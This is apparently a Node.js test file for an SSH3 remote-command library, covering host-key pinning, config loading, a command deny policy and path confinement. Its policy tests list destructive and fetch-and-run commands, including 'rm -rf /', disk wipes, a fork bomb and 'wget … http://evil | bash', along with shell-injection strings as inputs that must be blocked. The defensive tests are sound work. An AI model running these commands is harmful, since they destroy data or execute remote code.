import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const joinHome = (home, rel) => join(home, rel);
import crypto from 'node:crypto';
import {
  expandHome,
  shellQuoteSingle,
  normalizeExitCode,
  buildSsh3Target,
  buildSsh3Args,
  loadHostsConfigFile,
  resolveConfigPath,
  makeHostVerifier,
  checkCommandPolicy,
  checkPathAllowed,
  truncateOutput,
  buildReadCommand,
  buildServerStatusCommand,
} from '../lib.mjs';

const FAKE_HOME = 'C:/Users/tester';

const sha256b64 = (value) => crypto.createHash('sha256').update(value).digest('base64');

test('makeHostVerifier returns undefined when no pin is configured', () => {
  assert.equal(makeHostVerifier(undefined), undefined);
  assert.equal(makeHostVerifier(null), undefined);
  assert.equal(makeHostVerifier(''), undefined);
  assert.equal(makeHostVerifier(42), undefined);
});

test('makeHostVerifier matches plain sha256 base64 (padded) host key', () => {
  const verifier = makeHostVerifier(sha256b64('host-key-blob'));
  assert.equal(verifier(Buffer.from('host-key-blob')), true);
});

test('makeHostVerifier accepts ssh-keygen style: SHA256 prefix and no padding', () => {
  const unpadded = sha256b64('host-key-blob').replace(/=+$/, '');
  const verifier = makeHostVerifier(`SHA256:${unpadded}`);
  assert.equal(verifier(Buffer.from('host-key-blob')), true);
  const verifier2 = makeHostVerifier(unpadded);
  assert.equal(verifier2(Buffer.from('host-key-blob')), true);
});

test('makeHostVerifier returns false on mismatched key, never throws', () => {
  const verifier = makeHostVerifier(sha256b64('host-key-blob'));
  assert.equal(verifier(Buffer.from('other-key')), false);
  assert.equal(verifier(Buffer.from('')), false);
});

test('expandHome expands leading ~/ to home dir', () => {
  assert.equal(expandHome('~/key.pem', FAKE_HOME), joinHome(FAKE_HOME, 'key.pem'));
});

test('expandHome leaves absolute and empty paths untouched', () => {
  assert.equal(expandHome('/etc/key.pem', FAKE_HOME), '/etc/key.pem');
  assert.equal(expandHome('', FAKE_HOME), '');
  assert.equal(expandHome(undefined, FAKE_HOME), undefined);
});

test('shellQuoteSingle wraps value and escapes embedded quotes', () => {
  assert.equal(shellQuoteSingle('foo'), `'foo'`);
  assert.equal(shellQuoteSingle(`foo'bar`), `'foo'\\''bar'`);
  assert.equal(shellQuoteSingle(''), `''`);
});

test('normalizeExitCode maps win32 unsigned 32-bit codes to signed', () => {
  assert.equal(normalizeExitCode(0), 0);
  assert.equal(normalizeExitCode(1), 1);
  assert.equal(normalizeExitCode(42), 42);
  assert.equal(normalizeExitCode(4294967295), -1);
  assert.equal(normalizeExitCode(4294967290), -6);
  assert.equal(normalizeExitCode(null), null);
});

test('buildSsh3Target composes user@host:port/urlPath', () => {
  assert.equal(
    buildSsh3Target({ user: 'max', host: 'wsl.example.lan', port: 443, urlPath: '/ssh3-term' }),
    'max@wsl.example.lan:443/ssh3-term',
  );
});

test('buildSsh3Target applies port 443 and "/" defaults', () => {
  assert.equal(buildSsh3Target({ user: 'u', host: 'h' }), 'u@h:443/');
});

test('buildSsh3Target rejects missing user or host', () => {
  assert.throws(() => buildSsh3Target({ host: 'h' }));
  assert.throws(() => buildSsh3Target({ user: 'u' }));
  assert.throws(() => buildSsh3Target({ user: 'u', host: 'h x' }));
});

test('buildSsh3Args places flags before positional target, command last', () => {
  const profile = {
    user: 'max',
    host: 'wsl.example.lan',
    port: 443,
    urlPath: '/ssh3-term',
    privateKeyPath: '~/.ssh/key',
    insecure: true,
    clientPath: 'ssh3.exe',
  };
  const args = buildSsh3Args(profile, 'echo ok', FAKE_HOME);
  assert.deepEqual(args, [
    '-privkey',
    joinHome(FAKE_HOME, '.ssh/key'),
    '-insecure',
    'max@wsl.example.lan:443/ssh3-term',
    'echo ok',
  ]);
});

test('buildSsh3Args omits key and insecure flags when unset', () => {
  const args = buildSsh3Args({ user: 'u', host: 'h' }, 'ls');
  assert.deepEqual(args, ['u@h:443/', 'ls']);
});

test('buildSsh3Args rejects empty command', () => {
  assert.throws(() => buildSsh3Args({ user: 'u', host: 'h' }, ''));
  assert.throws(() => buildSsh3Args({ user: 'u', host: 'h' }, undefined));
});

test('loadHostsConfigFile reads and validates hosts config', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ssh-hosts-'));
  const p = join(dir, 'hosts.json');
  writeFileSync(p, JSON.stringify({ version: 1, hosts: { a: { host: 'h', user: 'u' } } }));
  const { configPath, hosts } = loadHostsConfigFile(p);
  assert.equal(configPath, p);
  assert.equal(hosts.a.user, 'u');
});

test('loadHostsConfigFile throws on config without hosts object', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ssh-hosts-'));
  const p = join(dir, 'hosts.json');
  writeFileSync(p, JSON.stringify({ version: 1 }));
  assert.throws(() => loadHostsConfigFile(p));
});

test('resolveConfigPath prefers env override, then hosts.local.json, then hosts.json', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ssh-hosts-'));
  const local = join(dir, 'hosts.local.json');
  const base = join(dir, 'hosts.json');
  writeFileSync(local, '{}');
  writeFileSync(base, '{}');

  assert.equal(resolveConfigPath(dir, join(dir, 'custom.json')), join(dir, 'custom.json'));
  assert.equal(resolveConfigPath(dir, ''), local);
  assert.equal(resolveConfigPath(dir, undefined), local);

  const onlyBase = mkdtempSync(join(tmpdir(), 'ssh-hosts-'));
  writeFileSync(join(onlyBase, 'hosts.json'), '{}');
  assert.equal(resolveConfigPath(onlyBase, undefined), join(onlyBase, 'hosts.json'));
});

// ---------- defaults merge + hot reload ----------

test('loadHostsConfigFile merges defaults into each host (shallow)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ssh-hosts-'));
  const p = join(dir, 'hosts.json');
  writeFileSync(
    p,
    JSON.stringify({
      version: 1,
      defaults: { maxOutputBytes: 1000, policy: { deny: ['bad'] } },
      hosts: { a: { host: 'h', policy: { deny: ['own'] } }, b: { host: 'h2' } },
    }),
  );
  const { hosts } = loadHostsConfigFile(p);
  assert.equal(hosts.a.maxOutputBytes, 1000);
  assert.deepEqual(hosts.a.policy, { deny: ['own'] }); // per-host wins wholesale
  assert.equal(hosts.b.maxOutputBytes, 1000);
  assert.deepEqual(hosts.b.policy, { deny: ['bad'] });
});

test('loadHostsConfigFile re-reads file on every call (hot reload)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ssh-hosts-'));
  const p = join(dir, 'hosts.json');
  writeFileSync(p, JSON.stringify({ version: 1, hosts: { a: { host: 'old' } } }));
  const first = loadHostsConfigFile(p);
  assert.equal(first.hosts.a.host, 'old');
  writeFileSync(p, JSON.stringify({ version: 1, hosts: { a: { host: 'new' } } }));
  const second = loadHostsConfigFile(p);
  assert.equal(second.hosts.a.host, 'new');
});

// ---------- command policy ----------

test('checkCommandPolicy allows everything when no policy configured', () => {
  assert.deepEqual(checkCommandPolicy(undefined, 'ls -la', 'bash'), { allowed: true });
  assert.deepEqual(checkCommandPolicy({}, 'reboot', 'bash'), { allowed: true });
});

test('checkCommandPolicy blocks never-allowed commands even without config', () => {
  for (const cmd of [
    'rm -rf /',
    'rm -fr /',
    'rm -r /',
    'rm --recursive --force /',
    'mkfs.ext4 /dev/sda1',
    'dd if=zero of=/dev/sda',
    'curl http://x.sh | sh',
    'wget -qO- http://evil | bash',
    ':(){ :|:& };:',
    'chmod -R 777 /',
  ]) {
    const res = checkCommandPolicy(undefined, cmd, 'bash');
    assert.equal(res.allowed, false, `expected deny: ${cmd}`);
    assert.match(res.reason, /never-allowed/);
  }
});

test('checkCommandPolicy never-allowed does not false-positive on legit paths', () => {
  for (const cmd of [
    'rm -rf /tmp/firmware.bin',
    'rm -r /overlay/etc',
    'dd if=a of=/tmp/out.img',
    'chmod +x /usr/bin/tool',
    'chmod 777 /tmp/dir',
  ]) {
    assert.equal(checkCommandPolicy(undefined, cmd, 'bash').allowed, true, cmd);
  }
});

test('checkCommandPolicy: deny regex blocks, deny wins over allow, fail closed', () => {
  const policy = { deny: ['apkg'], allow: ['^opkg'] };
  assert.equal(checkCommandPolicy(policy, 'opkg remove apkg', 'bash').allowed, false);
  const res = checkCommandPolicy(policy, 'opkg list', 'bash');
  assert.equal(res.allowed, true);
  // allow mode: non-matching command rejected
  assert.equal(checkCommandPolicy(policy, 'ls /', 'bash').allowed, false);
});

test('checkCommandPolicy: whitelist mode rejects shell chaining metacharacters', () => {
  const policy = { allow: ['.*'] };
  for (const cmd of [
    'ls; rm x',
    'ls && rm x',
    'ls || rm x',
    'ls | tee f',
    'echo `id`',
    'echo $(id)',
    'ls > /etc/f',
    'cat < /etc/f',
  ]) {
    assert.equal(checkCommandPolicy(policy, cmd, 'bash').allowed, false, cmd);
  }
});

test('checkCommandPolicy: routeros shell allows pipes even in whitelist mode', () => {
  const policy = { allow: ['^/log'] };
  const res = checkCommandPolicy(policy, '/log print | where message~"x"', 'routeros');
  assert.equal(res.allowed, true);
});

// ---------- path confinement ----------

test('checkPathAllowed: absolute posix required, traversal rejected', () => {
  const prof = { allowedPaths: { read: ['/etc/'] } };
  assert.equal(checkPathAllowed('relative/file', 'read', prof).allowed, false);
  assert.equal(checkPathAllowed('/etc/../secret', 'read', prof).allowed, false);
  assert.equal(checkPathAllowed('/etc/config', 'read', prof).allowed, true);
  assert.equal(checkPathAllowed('/var/log/x', 'read', prof).allowed, false);
});

test('checkPathAllowed: unconstrained when lists absent; read/write separated', () => {
  assert.equal(checkPathAllowed('/any/file', 'read', {}).allowed, true);
  const prof = { allowedPaths: { read: ['/etc'], write: ['/tmp'] } };
  assert.equal(checkPathAllowed('/etc/x', 'write', prof).allowed, false);
  assert.equal(checkPathAllowed('/tmp/y', 'write', prof).allowed, true);
  assert.equal(checkPathAllowed('/tmps/z', 'write', prof).allowed, false); // prefix must be segment-bounded
});

// ---------- output limit ----------

test('truncateOutput cuts by bytes and flags truncation', () => {
  const big = 'x'.repeat(100);
  const r = truncateOutput(big, 10);
  assert.ok(r.text.startsWith('x'.repeat(10)));
  assert.match(r.text, /truncated at 10 bytes/);
  assert.equal(r.truncated, true);
  assert.equal(truncateOutput(big, 200).truncated, false);
  assert.equal(truncateOutput(big, undefined).truncated, false);
});

// ---------- read pagination ----------

test('buildReadCommand: offset+limit via tail|head, quoted path', () => {
  assert.equal(
    buildReadCommand('/var/log/log', 128, 4096),
    `tail -c +129 '/var/log/log' | head -c 4096`,
  );
});

test('buildReadCommand: offset 0 uses plain head, invalid args rejected', () => {
  assert.equal(buildReadCommand('/f', 0, 100), `head -c 100 '/f'`);
  assert.throws(() => buildReadCommand('/f', -1, 100));
  assert.throws(() => buildReadCommand('/f', 0, 0));
});

// ---------- server status ----------

test('buildServerStatusCommand: bash busybox sections, routeros resource print', () => {
  const bash = buildServerStatusCommand('bash');
  assert.match(bash, /\/proc\/uptime/);
  assert.match(bash, /\/proc\/loadavg/);
  assert.match(bash, /\bfree\b/);
  assert.match(bash, /\bdf -h\b/);
  assert.equal(buildServerStatusCommand('routeros'), '/system resource print');
  assert.equal(buildServerStatusCommand(undefined), buildServerStatusCommand('bash'));
});
